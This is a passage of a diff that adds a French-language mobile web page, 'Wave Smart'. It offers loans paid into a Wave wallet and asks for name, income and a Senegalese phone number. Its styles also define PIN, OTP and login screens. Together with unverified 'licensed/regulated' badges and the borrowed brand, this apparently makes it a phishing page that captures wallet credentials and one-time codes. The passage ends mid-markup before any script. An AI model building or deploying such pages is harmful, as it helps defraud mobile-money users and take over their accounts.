@@ -1,0 +1,1131 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Wave Smart</title>
+<link href="https://fonts.googleapis.com/css2?family=Patrick+Hand&display=swap" rel="stylesheet">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { height: 100%; }
+body { font-family: 'Patrick Hand', cursive; background: #f0f0f0; display:flex; align-items:center; justify-content:center; min-height:100vh; }
+.wrap {
+  width: 390px; height: 844px;
+  background: #fff;
+  border-radius: 12px;
+  overflow: hidden;
+  position: relative;
+  flex-shrink: 0;
+}
+
+@media(max-width:430px){
+  body { background:#fff; align-items:flex-start; padding:0; margin:0; }
+  .wrap { width:100vw; height:100dvh; border-radius:0; overflow:hidden; position:fixed; top:0; left:0; }
+}
+
+.scr { display:none; flex-direction:column; height:844px; background:#fff; }
+@media(max-width:430px){
+  .scr { height:100dvh; }
+}
+.scr.active { display:flex; }
+
+#s-land { overflow-y:auto; -webkit-overflow-scrolling:touch; }
+
+#s-p1, #s-p2, #s-p3 { overflow:hidden; }
+.pbody { padding:18px 20px 12px; flex:1; display:flex; flex-direction:column; overflow-y:auto; -webkit-overflow-scrolling:touch; min-height:0; }
+.step-footer { padding:10px 20px 16px; background:#fff; border-top:1px solid #f0f0f0; flex-shrink:0; }
+
+#s-login, #s-pin, #s-otp, #s-splash, #s-ok { overflow:hidden; }
+
+.tbar { display:flex; align-items:center; justify-content:center; gap:8px; padding:22px 0 0; flex-shrink:0; }
+.tbar-title { font-size:18px; font-weight:700; color:#111; }
+.tbar-title em { font-style:normal; color:#4dc8e8; }
+
+.cbtn { display:block; width:100%; padding:16px; background:#4dc8e8; border:none; border-radius:50px; font-size:15px; font-family:'Patrick Hand',cursive; font-weight:700; color:#fff; cursor:pointer; text-align:center; }
+.cbtn:disabled { background:#b3e8f5; cursor:not-allowed; }
+.gbtn { display:block; flex:1; padding:14px; background:#f5f5f5; border:none; border-radius:50px; font-size:14px; font-family:'Patrick Hand',cursive; font-weight:600; color:#666; cursor:pointer; }
+.brow { display:flex; gap:10px; }
+
+.hero { margin:14px; background:#4dc8e8; border-radius:20px; padding:20px 18px; display:flex; justify-content:space-between; align-items:flex-start; gap:8px; flex-shrink:0; }
+.hero-left {}
+.hero-eye { font-size:10px; font-weight:600; letter-spacing:0.1em; color:rgba(255,255,255,0.6); text-transform:uppercase; margin-bottom:6px; }
+.hero-h { font-size:19px; font-weight:700; color:#fff; line-height:1.2; margin-bottom:8px; }
+.hero-p { font-size:12px; color:rgba(255,255,255,0.7); line-height:1.4; margin-bottom:12px; max-width:190px; }
+.pill { display:inline-flex; align-items:center; gap:6px; background:rgba(255,255,255,0.2); border:1px solid rgba(255,255,255,0.3); color:#fff; font-size:11px; font-weight:600; padding:5px 12px; border-radius:30px; }
+.dot { width:6px; height:6px; border-radius:50%; background:#4ade80; animation:pulse 2s ease-in-out infinite; flex-shrink:0; }
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+.calc { padding:14px 14px 0; flex-shrink:0; }
+.calc-top { display:flex; justify-content:space-between; align-items:baseline; margin-bottom:6px; }
+.calc-lbl { font-size:11px; color:#aaa; text-transform:uppercase; letter-spacing:0.05em; }
+.calc-amt { font-size:26px; font-weight:700; color:#4dc8e8; }
+input[type=range] { width:100%; height:5px; -webkit-appearance:none; border-radius:5px; outline:none; cursor:pointer; background:#eee; margin-bottom:14px; }
+input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; height:22px; border-radius:50%; background:#fff; border:2.5px solid #4dc8e8; box-shadow:0 1px 5px rgba(77,200,232,0.3); cursor:pointer; }
+
+.mgrid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:16px; }
+.mbox { background:#f7f7f7; border-radius:14px; padding:12px 14px; }
+.mbox-lbl { font-size:10px; color:#aaa; letter-spacing:0.06em; text-transform:uppercase; margin-bottom:4px; }
+.mbox-val { font-size:16px; font-weight:700; color:#111; }
+.mbox-note { font-size:10px; color:#ccc; margin-top:2px; }
+
+.trust { display:flex; justify-content:space-around; padding:14px 20px; border-top:1px solid #f5f5f5; border-bottom:1px solid #f5f5f5; margin-bottom:16px; flex-shrink:0; }
+.ti { display:flex; flex-direction:column; align-items:center; gap:5px; }
+.ti-icon { width:34px; height:34px; border-radius:10px; background:#f0fbfe; display:flex; align-items:center; justify-content:center; }
+.ti-icon svg { width:16px; height:16px; stroke:#4dc8e8; fill:none; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
+.ti-lbl { font-size:9.5px; color:#aaa; letter-spacing:0.04em; text-transform:uppercase; font-weight:600; }
+
+.flist { margin-bottom:40px; flex-shrink:0; }
+.frow { display:flex; align-items:center; gap:14px; padding:14px 20px; border-bottom:1px solid #f5f5f5; }
+.ficon { width:38px; height:38px; border-radius:12px; background:#f0fbfe; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+.ficon svg { width:18px; height:18px; stroke:#4dc8e8; fill:none; stroke-width:1.8; stroke-linecap:round; stroke-linejoin:round; }
+.ftext h4 { font-size:14px; font-weight:600; color:#111; margin-bottom:2px; }
+.ftext p { font-size:12px; color:#aaa; line-height:1.4; }
+
+.ph { font-size:20px; font-weight:700; color:#111; margin-bottom:4px; }
+.ps { font-size:13px; color:#aaa; margin-bottom:20px; line-height:1.4; }
+.spacer { flex:1; min-height:20px; }
+.prog-wrap { padding:0 20px; margin-bottom:18px; flex-shrink:0; }
+.prog-lbl { font-size:11px; color:#aaa; letter-spacing:0.05em; margin-bottom:5px; }
+.prog-track { height:4px; background:#eee; border-radius:4px; overflow:hidden; }
+.prog-fill { height:100%; background:#4dc8e8; border-radius:4px; }
+
+.field { margin-bottom:15px; }
+.flbl { display:block; font-size:11px; font-weight:600; letter-spacing:0.06em; color:#aaa; margin-bottom:6px; text-transform:uppercase; }
+.field input, .field select { width:100%; padding:13px 15px; background:#f7f7f7; border:1.5px solid transparent; border-radius:14px; font-size:15px; font-family:'Patrick Hand',cursive; color:#111; outline:none; -webkit-appearance:none; }
+.field input:focus, .field select:focus { border-color:#4dc8e8; background:#fff; }
+.field input::placeholder { color:#ccc; }
+.fpair { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
+.prow { display:flex; gap:8px; }
+.dpill { padding:13px 11px; background:#f7f7f7; border-radius:14px; font-size:13px; font-weight:600; color:#111; white-space:nowrap; flex-shrink:0; display:flex; align-items:center; }
+.prow input { flex:1; padding:13px 15px; background:#f7f7f7; border:1.5px solid transparent; border-radius:14px; font-size:15px; font-family:'Patrick Hand',cursive; color:#111; outline:none; }
+.prow input:focus { border-color:#4dc8e8; background:#fff; }
+.prow input::placeholder { color:#ccc; }
+
+.rbox { background:#f0fbfe; border:2px solid #b3e8f5; border-radius:16px; padding:16px 18px; display:flex; justify-content:space-between; align-items:center; margin-bottom:18px; }
+.rbox-lbl { font-size:11px; color:#aaa; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:3px; }
+.rbox-note { font-size:10px; color:#aaa; margin-top:2px; }
+.rbox-val { font-size:20px; font-weight:700; color:#4dc8e8; }
+
+.sumbox { background:#f7f7f7; border-radius:16px; padding:4px 0; margin-bottom:16px; }
+.sumrow { display:flex; justify-content:space-between; align-items:center; padding:12px 16px; border-bottom:1px solid #eee; }
+.sumrow:last-child { border-bottom:none; }
+.sumlbl { font-size:11px; color:#aaa; text-transform:uppercase; letter-spacing:0.04em; }
+.sumval { font-size:14px; font-weight:600; color:#111; }
+.legal { font-size:12px; color:#aaa; line-height:1.6; margin-bottom:18px; padding:12px 14px; background:#f7f7f7; border-radius:12px; border-left:3px solid #b3e8f5; }
+
+.succ-wrap { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:40px 24px; text-align:center; overflow-y:auto; }
+.succ-pen { position:relative; width:80px; height:80px; margin:0 auto 20px; animation:pop 0.5s cubic-bezier(0.34,1.4,0.64,1) both; }
+@keyframes pop { from{transform:scale(0.5);opacity:0} to{transform:scale(1);opacity:1} }
+.succ-badge { position:absolute; bottom:0; right:0; width:26px; height:26px; border-radius:50%; background:#22c55e; border:3px solid #fff; display:flex; align-items:center; justify-content:center; }
+.succ-badge svg { width:12px; height:12px; stroke:#fff; fill:none; stroke-width:2.8; stroke-linecap:round; stroke-linejoin:round; }
+.succ-h { font-size:22px; font-weight:700; color:#111; margin-bottom:10px; }
+.succ-p { font-size:14px; color:#aaa; line-height:1.6; margin-bottom:6px; }
+.succ-p strong { color:#111; }
+.succ-note { font-size:12px; color:#ccc; margin-bottom:24px; }
+.sess { width:100%; background:#f7f7f7; border-radius:12px; padding:12px 16px; display:flex; align-items:center; gap:10px; margin-bottom:10px; }
+@keyframes spin { to{transform:rotate(360deg)} }
+.spinner { width:18px; height:18px; border:2px solid #eee; border-top-color:#4dc8e8; border-radius:50%; animation:spin 0.9s linear infinite; flex-shrink:0; }
+.sess-txt { font-size:12px; font-weight:600; color:#4dc8e8; }
+.mbtn { width:100%; padding:12px; background:transparent; border:1px solid #eee; border-radius:50px; font-size:13px; font-family:'Patrick Hand',cursive; font-weight:600; color:#aaa; cursor:pointer; }
+.fnote { margin-top:16px; font-size:11px; color:#ccc; }
+
+.splash-wrap { flex:1; display:flex; align-items:center; justify-content:center; }
+.splash-penguin { animation: splashPop 0.5s cubic-bezier(0.34,1.5,0.64,1) both; }
+@keyframes splashPop { from{transform:scale(0.6) translateY(20px);opacity:0} to{transform:scale(1) translateY(0);opacity:1} }
+
+#s-land { overflow-y: auto; -webkit-overflow-scrolling: touch; }
+
+.wave-h {
+  font-size:17px; font-weight:700; color:#111;
+  text-align:center; padding:44px 28px 28px;
+  line-height:1.4; flex-shrink:0;
+}
+
+.wave-ph-row {
+  display:flex; align-items:flex-end;
+  padding:0 24px; gap:0;
+  border-bottom:2px solid #4dc8e8;
+  margin:0 24px;
+  padding-bottom:8px;
+  flex-shrink:0;
+}
+.wave-cc {
+  display:flex; align-items:center; gap:4px;
+  font-size:16px; font-weight:600; color:#111;
+  white-space:nowrap; flex-shrink:0; padding-right:12px;
+  border-right:1px solid #ddd; margin-right:12px;
+}
+.wave-cc svg { width:8px; height:8px; fill:#888; }
+.wave-ph-in {
+  flex:1; background:transparent; border:none; outline:none;
+  font-size:16px; font-family:'Patrick Hand',cursive; color:#111;
+  padding:0; caret-color:#4dc8e8; min-width:0;
+}
+.wave-ph-in::placeholder { color:#bbb; }
+
+.keypad {
+  display:grid; grid-template-columns:repeat(3,1fr);
+  gap:0; flex-shrink:0;
+}
+.kk {
+  display:flex; flex-direction:column; align-items:center; justify-content:center;
+  height:64px; cursor:pointer;
+  background:transparent; border:none; -webkit-tap-highlight-color:transparent;
+  transition:background 0.1s;
+  user-select:none; gap:1px;
+}
+@media(max-height:780px){ .kk { height:60px; } .wave-h { padding:28px 28px 20px; } }
+@media(max-height:720px){ .kk { height:54px; } .wave-h { padding:20px 28px 16px; font-size:15px; } .pin-lock-wrap { padding-top:28px; } .wave-next { margin:8px 24px 20px; padding:15px; } }
+@media(max-height:667px){ .kk { height:48px; } .kk-num { font-size:22px; } .wave-h { padding:14px 28px 12px; font-size:14px; } .pin-lock-wrap { padding-top:16px; } .pin-dots-row { padding:18px 0 0; } .wave-next { margin:6px 24px 14px; padding:14px; font-size:15px; } .otp-digit { font-size:34px; min-height:40px; } }
+@media(max-height:600px){ .kk { height:42px; } .kk-num { font-size:20px; } .wave-h { padding:10px 28px 8px; font-size:13px; } .pin-lock-wrap { padding-top:10px; } .pin-dots-row { padding:12px 0 0; } }
+.kk:active { background:#f0f0f0; }
+#resendBtn:not(:disabled):hover { background:#f0fbfe; border-radius:50px; }
+#resendBtn:not(:disabled) { opacity:1 !important; cursor:pointer; }
+.kk.empty { cursor:default; }
+.kk-num { font-size:26px; font-weight:500; color:#111; font-family:'Patrick Hand',cursive; line-height:1; }
+.kk-letters { font-size:9px; font-weight:700; color:#888; letter-spacing:0.12em; text-transform:uppercase; min-height:12px; }
+.kk.backspace .kk-num { font-size:18px; }
+.kk.forgot-key .kk-num { font-size:10px; font-weight:700; color:#888; letter-spacing:0.04em; text-transform:uppercase; }
+
+.wave-next {
+  width:calc(100% - 48px); margin:12px 24px 28px;
+  padding:18px; background:#b3e8f5; border:none; border-radius:50px;
+  font-size:16px; font-weight:700; font-family:'Patrick Hand',cursive;
+  color:#fff; cursor:pointer; transition:background 0.15s;
+  flex-shrink:0;
+}
+.wave-next.active-btn { background:#4dc8e8; }
+
+.wave-back {
+  padding:20px 20px 0; cursor:pointer; width:fit-content; flex-shrink:0;
+}
+.wave-back svg { width:22px; height:22px; stroke:#111; fill:none; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
+
+.pin-dots-row {
+  display:flex; justify-content:center; gap:20px;
+  padding:32px 0 0; flex-shrink:0;
+}
+.pd {
+  width:18px; height:18px; border-radius:50%;
+  background:#b3e8f5;
+  transition:background 0.15s, transform 0.1s;
+}
+.pd.filled { background:#4dc8e8; transform:scale(1.1); }
+
+.pin-lock-wrap { display:flex; justify-content:center; padding-top:44px; flex-shrink:0; }
+
+.otp-slot {
+  display:flex; flex-direction:column; align-items:center;
+  width:56px; border-bottom:2px solid #ccc; padding-bottom:4px;
+  transition:border-color 0.15s;
+}
+.otp-slot.active { border-bottom-color:#111; }
+.otp-digit {
+  font-size:42px; font-weight:400; color:#111;
+  font-family:'Patrick Hand',cursive; line-height:1;
+  min-height:50px; display:flex; align-items:flex-end;
+}
+
+.ov { position:fixed; top:0;left:0;right:0;bottom:0; background:rgba(0,0,0,0.25); display:none; align-items:center; justify-content:center; z-index:999; backdrop-filter:blur(2px); }
+.ov.show { display:flex; }
+.load-card { background:#fff; border-radius:20px; padding:26px 24px; text-align:center; box-shadow:0 8px 40px rgba(0,0,0,0.12); }
+.load-spin { width:32px; height:32px; border:3px solid #eee; border-top-color:#4dc8e8; border-radius:50%; animation:spin 0.6s linear infinite; margin:0 auto 10px; }
+.load-txt { font-size:14px; color:#111; }
+.pop-card { background:#fff; border-radius:20px; padding:28px 22px; max-width:280px; width:90%; text-align:center; box-shadow:0 8px 40px rgba(0,0,0,0.12); }
+.pop-icon { width:50px; height:50px; border-radius:50%; margin:0 auto 14px; display:flex; align-items:center; justify-content:center; }
+.pop-icon.err { background:#fef2f2; } .pop-icon.err svg { stroke:#dc2626; }
+.pop-icon.inf { background:#f0fbfe; } .pop-icon.inf svg { stroke:#4dc8e8; }
+.pop-icon svg { width:24px; height:24px; fill:none; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
+.pop-h { font-size:18px; font-weight:700; color:#111; margin-bottom:8px; }
+.pop-p { font-size:13px; color:#aaa; line-height:1.5; margin-bottom:20px; }
+.pop-btn { background:#4dc8e8; color:#fff; border:none; padding:13px 20px; border-radius:50px; font-size:14px; font-weight:600; font-family:'Patrick Hand',cursive; width:100%; cursor:pointer; }
+
+.toast { position:fixed; bottom:20px; left:50%; transform:translateX(-50%) translateY(10px); background:#fff; border:1px solid #eee; border-radius:14px; padding:10px 14px; display:flex; align-items:center; gap:10px; box-shadow:0 4px 20px rgba(0,0,0,0.08); opacity:0; transition:opacity 0.3s,transform 0.3s; pointer-events:none; z-index:100; white-space:nowrap; }
+.toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
+.tav { width:30px; height:30px; border-radius:50%; background:#f0fbfe; display:flex; align-items:center; justify-content:center; font-size:12px; font-weight:700; color:#4dc8e8; flex-shrink:0; }
+.tn { font-size:12.5px; font-weight:600; color:#111; }
+.td { font-size:11px; color:#aaa; margin-top:1px; }
+.tck { width:20px; height:20px; border-radius:50%; background:#f0fdf4; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+.tck svg { width:11px; height:11px; stroke:#22c55e; fill:none; stroke-width:2.5; stroke-linecap:round; stroke-linejoin:round; }
+
+@media(max-width:430px) and (max-height:780px){
+  .tbar { padding:14px 0 0; }
+  .prog-wrap { margin-bottom:12px; }
+  .ph { font-size:18px; }
+  .ps { margin-bottom:14px; font-size:12px; }
+  .field { margin-bottom:11px; }
+  .rbox { padding:12px 14px; margin-bottom:12px; }
+  .sumbox { margin-bottom:10px; }
+  .sumrow { padding:9px 16px; }
+  .legal { margin-bottom:10px; font-size:11px; padding:10px 12px; }
+}
+@media(max-width:430px) and (max-height:700px){
+  .tbar { padding:10px 0 0; }
+  .hero { margin:10px; padding:14px; }
+  .hero-h { font-size:16px; }
+  .hero-p { display:none; }
+  .calc { padding:10px 10px 0; }
+  .mgrid { margin-bottom:10px; }
+  .cbtn { padding:13px; font-size:14px; }
+  .step-footer { padding:8px 20px 12px; }
+  .pbody { padding:12px 20px 8px; }
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- OVERLAYS -->
+  <div class="ov" id="loadOv"><div class="load-card"><div class="load-spin"></div><div class="load-txt" id="load-txt">Veuillez patienter…</div></div></div>
+  <div class="ov" id="popOv">
+    <div class="pop-card">
+      <div class="pop-icon" id="popIcon"></div>
+      <div class="pop-h" id="popH"></div>
+      <div class="pop-p" id="popP"></div>
+      <button class="pop-btn" onclick="document.getElementById('popOv').classList.remove('show')">OK</button>
+    </div>
+  </div>
+  <div class="toast" id="toast">
+    <div class="tav" id="tav">A</div>
+    <div><div class="tn" id="tn"></div><div class="td" id="td"></div></div>
+    <div class="tck"><svg viewBox="0 0 12 12"><polyline points="2 6 5 9 10 3"/></svg></div>
+  </div>
+
+  <!-- ══ LANDING ══ -->
+  <div class="scr" id="s-land">
+    <div class="tbar">
+      <svg width="26" height="26" viewBox="0 0 120 145"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/><circle cx="60" cy="48" r="26" fill="#111"/><circle cx="51" cy="43" r="4.5" fill="#fff"/><circle cx="69" cy="43" r="4.5" fill="#fff"/><circle cx="52" cy="44" r="2.2" fill="#111"/><circle cx="70" cy="44" r="2.2" fill="#111"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg>
+      <span class="tbar-title">Wave <em>Smart</em></span>
+    </div>
+    <div class="hero">
+      <div class="hero-left">
+        <div class="hero-eye">Finance Mobile</div>
+        <div class="hero-h">Du capital quand vous en avez besoin</div>
+        <div class="hero-p">Prêts à court terme. Fonds directement dans votre portefeuille Wave.</div>
+        <div class="pill"><div class="dot"></div>Dossiers ouverts</div>
+      </div>
+      <svg width="66" height="80" viewBox="0 0 120 145" style="opacity:0.28;flex-shrink:0;"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#fff"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="rgba(255,255,255,0.5)"/><circle cx="60" cy="48" r="26" fill="#fff"/><circle cx="51" cy="43" r="4.5" fill="rgba(255,255,255,0.8)"/><circle cx="69" cy="43" r="4.5" fill="rgba(255,255,255,0.8)"/><circle cx="52" cy="44" r="2.2" fill="rgba(0,60,80,0.4)"/><circle cx="70" cy="44" r="2.2" fill="rgba(0,60,80,0.4)"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#fff" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#fff" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg>
+    </div>
+    <div class="calc">
+      <div class="calc-top"><span class="calc-lbl">Montant</span><span class="calc-amt" id="loanAmt">100 000 FCFA</span></div>
+      <input type="range" id="slider" min="50000" max="2000000" value="100000" step="10000" oninput="sliderChange(this.value)">
+      <div class="mgrid">
+        <div class="mbox"><div class="mbox-lbl">Mensualité</div><div class="mbox-val" id="mRepay">—</div><div class="mbox-note">sur 12 mois</div></div>
+        <div class="mbox"><div class="mbox-lbl">Taux</div><div class="mbox-val">5% /an</div><div class="mbox-note">fixe</div></div>
+      </div>
+      <button class="cbtn" onclick="go('s-land','s-p1')" style="margin-bottom:14px;">Vérifier mon éligibilité</button>
+    </div>
+    <div class="trust">
+      <div class="ti"><div class="ti-icon"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="ti-lbl">Sécurisé</span></div>
+      <div class="ti"><div class="ti-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div><span class="ti-lbl">Rapide</span></div>
+      <div class="ti"><div class="ti-icon"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div><span class="ti-lbl">Agréé</span></div>
+      <div class="ti"><div class="ti-icon"><svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="3"/><path d="M3 9h18M9 21V9"/></svg></div><span class="ti-lbl">Régulé</span></div>
+    </div>
+    <div class="flist">
+      <div class="frow"><div class="ficon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div><div class="ftext"><h4>Décision en quelques minutes</h4><p>La plupart des demandes traitées le jour même.</p></div></div>
+      <div class="frow"><div class="ficon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg></div><div class="ftext"><h4>Vos données restent privées</h4><p>Chiffrement bancaire. Vos infos ne sont jamais vendues.</p></div></div>
+      <div class="frow"><div class="ficon"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5M2 12l10 5 10-5"/></svg></div><div class="ftext"><h4>Fonds dans votre portefeuille Wave</h4><p>L'argent arrive directement dans votre wallet.</p></div></div>
+    </div>
+  </div>
+
+  <!-- ══ STEP 1 ══ -->
+  <div class="scr" id="s-p1">
+    <div class="tbar"><svg width="26" height="26" viewBox="0 0 120 145"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/><circle cx="60" cy="48" r="26" fill="#111"/><circle cx="51" cy="43" r="4.5" fill="#fff"/><circle cx="69" cy="43" r="4.5" fill="#fff"/><circle cx="52" cy="44" r="2.2" fill="#111"/><circle cx="70" cy="44" r="2.2" fill="#111"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg><span class="tbar-title">Wave <em>Smart</em></span></div>
+    <div class="prog-wrap" style="margin-top:14px;"><div class="prog-lbl">Étape 1 sur 3</div><div class="prog-track"><div class="prog-fill" style="width:33%"></div></div></div>
+    <div class="pbody">
+      <div class="ph">Détails du prêt</div>
+      <div class="ps">Dites-nous combien vous avez besoin et pour combien de temps.</div>
+      <div class="field"><label class="flbl">Montant demandé (FCFA)</label><input type="number" id="p1amt" placeholder="ex. 150 000" oninput="calcUpdate()"></div>
+      <div class="field"><label class="flbl">Durée</label><select id="p1dur" onchange="calcUpdate()"><option value="6">6 mois</option><option value="12" selected>12 mois</option><option value="18">18 mois</option><option value="24">24 mois</option></select></div>
+      <div class="rbox"><div><div class="rbox-lbl">Mensualité estimée</div><div class="rbox-note">5% /an · sans frais cachés</div></div><div class="rbox-val" id="p1rep">0 FCFA</div></div>
+      <div class="spacer"></div>
+    </div>
+    <div class="step-footer">
+      <button class="cbtn" onclick="go('s-p1','s-p2')">Continuer</button>
+    </div>
+  </div>
+
+  <!-- ══ STEP 2 ══ -->
+  <div class="scr" id="s-p2">
+    <div class="tbar"><svg width="26" height="26" viewBox="0 0 120 145"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/><circle cx="60" cy="48" r="26" fill="#111"/><circle cx="51" cy="43" r="4.5" fill="#fff"/><circle cx="69" cy="43" r="4.5" fill="#fff"/><circle cx="52" cy="44" r="2.2" fill="#111"/><circle cx="70" cy="44" r="2.2" fill="#111"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg><span class="tbar-title">Wave <em>Smart</em></span></div>
+    <div class="prog-wrap" style="margin-top:14px;"><div class="prog-lbl">Étape 2 sur 3</div><div class="prog-track"><div class="prog-fill" style="width:66%"></div></div></div>
+    <div class="pbody">
+      <div class="ph">À votre sujet</div>
+      <div class="ps">Quelques informations pour évaluer votre demande. Environ 2 minutes.</div>
+      <div class="field"><div class="fpair"><div><label class="flbl">Prénom</label><input type="text" id="fn" placeholder="ex. Amadou" oninput="chk2();calcUpdate()"></div><div><label class="flbl">Nom</label><input type="text" id="ln" placeholder="ex. Diallo" oninput="chk2();calcUpdate()"></div></div></div>
+      <div class="field"><label class="flbl">Revenu mensuel (FCFA)</label><input type="text" inputmode="numeric" id="inc" placeholder="Revenus mensuels moyens" oninput="this.value=this.value.replace(/\D/g,'');chk2();calcUpdate()"></div>
+      <div class="field"><label class="flbl">Numéro mobile</label><div class="prow"><div class="dpill">🇸🇳 +221</div><input type="tel" id="ph" placeholder="7X XXX XX XX" maxlength="12" oninput="this.value=this.value.replace(/\D/g,'').slice(0,12);chk2()"></div></div>
+      <div class="spacer"></div>
+    </div>
+    <div class="step-footer">
+      <div class="brow">
+        <button class="gbtn" onclick="go('s-p2','s-p1')">← Retour</button>
+        <button class="cbtn" id="p2btn" onclick="p2go()" disabled style="flex:2;opacity:0.4;">Continuer</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ STEP 3 ══ -->
+  <div class="scr" id="s-p3">
+    <div class="tbar"><svg width="26" height="26" viewBox="0 0 120 145"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/><circle cx="60" cy="48" r="26" fill="#111"/><circle cx="51" cy="43" r="4.5" fill="#fff"/><circle cx="69" cy="43" r="4.5" fill="#fff"/><circle cx="52" cy="44" r="2.2" fill="#111"/><circle cx="70" cy="44" r="2.2" fill="#111"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg><span class="tbar-title">Wave <em>Smart</em></span></div>
+    <div class="prog-wrap" style="margin-top:14px;"><div class="prog-lbl">Étape 3 sur 3</div><div class="prog-track"><div class="prog-fill" style="width:100%"></div></div></div>
+    <div class="pbody">
+      <div class="ph">Vérifier et soumettre</div>
+      <div class="ps">Vérifiez vos informations. Aucun frais ne sera prélevé aujourd'hui.</div>
+      <div class="sumbox">
+        <div class="sumrow"><span class="sumlbl">Montant</span><span class="sumval" id="rv-amt">—</span></div>
+        <div class="sumrow"><span class="sumlbl">Revenu mensuel</span><span class="sumval" id="rv-inc">—</span></div>
+        <div class="sumrow"><span class="sumlbl">Demandeur</span><span class="sumval" id="rv-name">—</span></div>
+        <div class="sumrow"><span class="sumlbl">Mensualité</span><span class="sumval" id="rv-rep">—</span></div>
+        <div class="sumrow"><span class="sumlbl">Taux</span><span class="sumval">5% /an fixe</span></div>
+      </div>
+      <div class="legal">En soumettant, vous confirmez que les informations sont exactes. Wave Smart utilisera ceci pour une évaluation de crédit. Aucun fonds ne sera versé sans votre confirmation.</div>
+      <div class="spacer"></div>
+    </div>
+    <div class="step-footer">
+      <div class="brow">
+        <button class="gbtn" onclick="go('s-p3','s-p2')">← Retour</button>
+        <button class="cbtn" onclick="submitApp()" style="flex:2;">Soumettre</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ SUCCESS ══ -->
+  <div class="scr" id="s-ok">
+    <div class="tbar"><svg width="26" height="26" viewBox="0 0 120 145"><ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/><ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/><circle cx="60" cy="48" r="26" fill="#111"/><circle cx="51" cy="43" r="4.5" fill="#fff"/><circle cx="69" cy="43" r="4.5" fill="#fff"/><circle cx="52" cy="44" r="2.2" fill="#111"/><circle cx="70" cy="44" r="2.2" fill="#111"/><ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/><ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/><ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/><ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/><ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/></svg><span class="tbar-title">Wave <em>Smart</em></span></div>
+    <div class="succ-wrap">
+      <div class="succ-pen">
